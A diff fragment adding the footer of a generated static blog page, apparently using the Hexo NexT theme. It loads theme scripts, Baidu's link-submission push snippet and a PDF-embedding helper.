+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+<!-- calendar widget -->
+
+
+</body>
+</html>
